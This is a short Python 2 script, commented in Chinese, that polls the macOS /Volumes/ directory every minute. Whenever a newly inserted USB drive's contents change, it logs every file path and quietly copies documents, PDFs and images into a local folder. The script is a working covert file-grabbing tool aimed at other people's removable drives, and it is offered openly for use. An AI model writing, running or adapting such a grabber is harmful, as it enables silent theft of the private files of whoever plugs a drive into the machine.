# -*- coding: utf-8 -*-
import os
import time 
import shutil
import string
USB = '/Volumes/'  # MacOS 上挂载的u盘目录
SAVE = ''  # 文件保存目录
# 注意此目录的上级目录必须存在
OLD=[]
# 文件类型
word="txt,doc,ppt,cpp,xls,pdf,ms10,pdf,jpg,\
jpeg,png,gif,TXT,DOC,PPT,CPP,XLS,PDF,MS10,\
PDF,JPG,JPEG,PNG,GIF".split(",")[:-1]

# 判断文件是否需要复制
def value(file):
    if os.path.isfile(file)==False:
        return 0
    for i in word:
        if string.find(file,i)>-1:
            return 1
    return 0
# 拷贝文件
def copyfile(file,filename):
    print SAVE+time.strftime("%m%d%H%M",time.localtime(time.time()))+filename
    shutil.copy(file,SAVE+time.strftime("%m%d%H%M",time.localtime(time.time()))+"#"+filename)
# U盘遍历
def usbWalker():
    if not os.path.exists(SAVE): 
        os.mkdir(SAVE)
    print "开始抓取U盘"
    f=open(SAVE+time.strftime("%m%d%H%M",time.localtime(time.time()))+".txt","w")
    for root, dirs, files in os.walk(USB): 
        for file in files:
            export = os.path.join(root,file)
            f.writelines(export+'\n')
            try :
                if value(export):
                    print "复制#"+export
                    copyfile(export,file)
            except: 
                 print("文件已经忽略")
    f.close
    print "拷贝文件完成"
            
# 简单判断U盘内容是否变化
def getusb():
    global OLD
    NEW=os.listdir(USB)
    if (len(NEW)==len(OLD)):
        print "U盘内容没有变化"
        return 0
    else:
        OLD=NEW
        return 1
# 如果存在配置文件则读入
if os.path.isfile("set.ini"):
    print "读入配置"
    ff=open("set.ini","r")
    USB=ff.readline()[:-1]
    SAVE=ff.readline()[:-1]
    word=ff.readline().split(",")[:-1]
    print USB,SAVE,word
        
while(1):
    if os.path.exists(USB):
        print "检测到U盘"
        if getusb():
            try :
                usbWalker()
            except:
                print "未知错误"
    else:
        print "暂时没有U盘"
    print "开始休眠"
    time.sleep(60) #休眠时间
    print "休眠结束"